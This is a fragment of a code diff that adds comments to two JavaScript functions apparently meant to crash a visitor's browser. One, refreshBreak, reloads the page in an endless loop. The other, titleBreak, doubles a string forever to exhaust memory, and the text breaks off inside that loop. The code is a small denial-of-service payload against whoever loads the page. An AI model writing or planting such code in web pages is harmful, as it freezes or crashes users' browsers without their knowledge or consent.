@@ -1,9 +1,9 @@
-function refreshBreak() {
+function refreshBreak() { //refresh break
   while(true) {
     location.reload()
   }
 }
-function titleBreak() {
+function titleBreak() { //title break
   var a = "5555"
   while(true) {
     a = a + a;
